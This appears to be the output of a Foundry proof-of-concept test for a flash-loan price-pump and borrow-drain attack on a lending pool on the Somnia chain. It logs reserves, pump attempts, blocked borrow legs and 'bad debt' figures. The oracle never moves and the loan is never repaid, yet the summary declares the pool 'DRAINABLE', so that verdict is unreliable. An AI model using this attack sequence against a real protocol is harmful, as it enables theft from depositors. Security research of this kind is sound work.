@@ -1,0 +1,288 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/SingleFile.t.sol:SomniaPoC
+[PASS] test_attack() (gas: 23234807)
+Logs:
+  block 461840478
+  --- reserve USDso
+    ltv 7500
+    liqThreshold 8500
+    decimals 18
+    active/frozen/borrowable true
+    borrowable true
+    borrowCap 125000
+    supplyCap 500000
+    eMode category 1
+    oracle price 99966341
+  --- reserve USDC.e
+    ltv 7500
+    liqThreshold 8500
+    decimals 6
+    active/frozen/borrowable true
+    borrowable true
+    borrowCap 10000
+    supplyCap 8000000
+    eMode category 1
+    oracle price 99966341
+  --- reserve WETH
+    ltv 7000
+    liqThreshold 8250
+    decimals 18
+    active/frozen/borrowable true
+    borrowable true
+    borrowCap 5
+    supplyCap 30
+    eMode category 0
+    oracle price 203299000000
+  --- reserve WBTC
+    ltv 6500
+    liqThreshold 7500
+    decimals 8
+    active/frozen/borrowable true
+    borrowable true
+    borrowCap 1
+    supplyCap 1
+    eMode category 0
+    oracle price 7278976085937
+  --- reserve WSOMI
+    ltv 6000
+    liqThreshold 7250
+    decimals 18
+    active/frozen/borrowable true
+    borrowable true
+    borrowCap 500000
+    supplyCap 20000000
+    eMode category 0
+    oracle price 16342083
+  user eMode 0
+  --- eMode category 1
+    ltv 32
+    liquidation threshold 9000
+    liquidation bonus 9700
+    EXPLOITABLE (ltv >= 10000) false
+  --- book
+    ask levels 20
+    best ask 162100000000000000
+    worst ask 1000000000000000000
+    USDso to clear every level 35370710453000000000000
+  === ORACLE PROBE (hold, never supply) flash USDso 39911791548300000000000
+    entered eMode category 1
+    leg 0x00000022dA000002656c64D9eA6011ea952D008A
+      power left USDso 241419957950000000000
+    borrowed 0x00000022dA000002656c64D9eA6011ea952D008A
+      amount 241501003352718491517
+      value18 241419716529999999999
+      cap 125000
+    leg 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      power left USDso 241430000000000
+    borrowed 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      amount 241
+      value18 240918881810000
+      cap 10000
+    leg 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      power left USDso 520000000000
+    borrow leg REVERTED 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      wanted 250862030
+      Error(string) 58
+    leg 0xC5098b3cA516784323872F17235fa074E167D3D2
+      power left USDso 520000000000
+    leg 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      power left USDso 520000000000
+    borrow leg REVERTED 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      wanted 3120777198353
+      Error(string) 58
+    status reverted
+    SOMI bought and HELD 2462150000000000000000
+    USDso spent into the book 399303716000000000000
+    exec price 162176843815364620
+    best ask before 162100000000000000
+    best ask after  162200000000000000
+    ASK MOVE BPS (did the pump work?) 6
+    oracle before 16342083
+    oracle after  16342083
+    ORACLE MOVE BPS (only number that matters) 0
+    oracle moved at all? false
+    entered eMode category 1
+    leg 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      power left USDso 2116979905990000000000
+    borrow leg REVERTED 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      wanted 12954149045810133261469
+      Error(string) 58
+    leg 0x00000022dA000002656c64D9eA6011ea952D008A
+      power left USDso 2116979905990000000000
+    borrowed 0x00000022dA000002656c64D9eA6011ea952D008A
+      amount 2117690582483158006153
+      value18 2116977789009999999999
+      cap 125000
+    leg 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      power left USDso 2116990000000000
+    borrowed 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      amount 2117
+      value18 2116287438970000
+      cap 10000
+    leg 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      power left USDso 1710000000000
+    borrow leg REVERTED 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      wanted 836206769
+      Error(string) 58
+    leg 0xC5098b3cA516784323872F17235fa074E167D3D2
+      power left USDso 1710000000000
+  === PUMP with flash USDso 35000000000000000000000
+  --- flash
+    principal 35000000000000000000000
+    repayment due 35017500000000000000000
+  --- pump
+    pump limit price 1621100000000000000
+    best ask before 162100000000000000
+    best ask after  162400000000000000
+    SOMI bought 21590270000000000000000
+    USDso spent 3504063518000000000000
+    exec price 162298272230963299
+  --- oracle
+    before 16342083
+    after  16342083
+    ORACLE MOVE BPS 0
+  --- borrow
+    supplied WSOMI 21590270000000000000000
+    borrow power USDso 2116979905990000000000
+    legs tried 5
+    legs borrowed 2
+    legs blocked 3
+    borrowed WSOMI 0
+    borrowed value USDso 2116979905297438969999
+    WSOMI sold back for USDso 0
+    WSOMI exit exec price 0
+  --- drain
+    extracted USDso 35730606969780596976152
+    repayment needed 35017500000000000000000
+    bad debt left in pool 1403872935516841993847
+    COVERAGE bps 10203
+    EDGE REALIZED bps 68
+    EDGE REQUIRED bps 6675
+    REPAID? false
+    entered eMode category 1
+    leg 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      power left USDso 3024257708930000000000
+    borrow leg REVERTED 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      wanted 18505931493983967649656
+      Error(string) 58
+    leg 0x00000022dA000002656c64D9eA6011ea952D008A
+      power left USDso 3024257708930000000000
+    borrowed 0x00000022dA000002656c64D9eA6011ea952D008A
+      amount 3025272961296042634990
+      value18 3024254684669999999999
+      cap 125000
+    leg 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      power left USDso 3024270000000000
+    borrowed 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      amount 3025
+      value18 3023981815250000
+      cap 10000
+    leg 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      power left USDso 290000000000
+    borrow leg REVERTED 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      wanted 137728173
+      Error(string) 58
+    leg 0xC5098b3cA516784323872F17235fa074E167D3D2
+      power left USDso 290000000000
+  === PUMP with flash USDso 50000000000000000000000
+  --- flash
+    principal 50000000000000000000000
+    repayment due 50025000000000000000000
+  --- pump
+    pump limit price 1621100000000000000
+    best ask before 162100000000000000
+    best ask after  162400000000000000
+    SOMI bought 30843250000000000000000
+    USDso spent 5006747470000000000000
+    exec price 162328790578165400
+  --- oracle
+    before 16342083
+    after  16342083
+    ORACLE MOVE BPS 0
+  --- borrow
+    supplied WSOMI 30843250000000000000000
+    borrow power USDso 3024257708930000000000
+    legs tried 5
+    legs borrowed 2
+    legs blocked 3
+    borrowed WSOMI 0
+    borrowed value USDso 3024257708651815249999
+    WSOMI sold back for USDso 0
+    WSOMI exit exec price 0
+  --- drain
+    extracted USDso 51042783199947857884989
+    repayment needed 50025000000000000000000
+    bad debt left in pool 2006474508703957365010
+    COVERAGE bps 10203
+    EDGE REALIZED bps 66
+    EDGE REQUIRED bps 6675
+    REPAID? false
+    entered eMode category 1
+    leg 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      power left USDso 7258219481980000000000
+    borrow leg REVERTED 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      wanted 44414241585726862358978
+      Error(string) 58
+    leg 0x00000022dA000002656c64D9eA6011ea952D008A
+      power left USDso 7258219481980000000000
+    borrow leg REVERTED 0x00000022dA000002656c64D9eA6011ea952D008A
+      wanted 7260656087992657448570
+      Error(string) 50
+    leg 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      power left USDso 7258219481980000000000
+    borrow leg REVERTED 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      wanted 7260656087
+      Error(string) 50
+    leg 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      power left USDso 7258219481980000000000
+    borrow leg REVERTED 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      wanted 3570215408713274536
+      Error(string) 58
+    leg 0xC5098b3cA516784323872F17235fa074E167D3D2
+      power left USDso 7258219481980000000000
+    borrow leg REVERTED 0xC5098b3cA516784323872F17235fa074E167D3D2
+      wanted 9971474
+      Error(string) 58
+  === PUMP with flash USDso 120000000000000000000000
+  --- flash
+    principal 120000000000000000000000
+    repayment due 120060000000000000000000
+  --- pump
+    pump limit price 1621100000000000000
+    best ask before 162100000000000000
+    best ask after  162600000000000000
+    SOMI bought 74023810000000000000000
+    USDso spent 12025438910000000000000
+    exec price 162453660653241166
+  --- oracle
+    before 16342083
+    after  16342083
+    ORACLE MOVE BPS 0
+  --- borrow
+    supplied WSOMI 74023810000000000000000
+    borrow power USDso 7258219481980000000000
+    legs tried 5
+    legs borrowed 0
+    legs blocked 5
+    borrowed WSOMI 0
+    borrowed value USDso 0
+    WSOMI sold back for USDso 0
+    WSOMI exit exec price 0
+  --- drain
+    extracted USDso 107974561090000000000000
+    repayment needed 120060000000000000000000
+    bad debt left in pool 12085438910000000000000
+    COVERAGE bps 8993
+    EDGE REALIZED bps 59
+    EDGE REQUIRED bps 6675
+    REPAID? false
+  === SUMMARY
+    best coverage bps 10203
+    at flash size 35000000000000000000000
+    break even bps 10000
+    verdict DRAINABLE
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.66s (12.66s CPU time)
+
+Ran 1 test suite in 12.85s (12.66s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
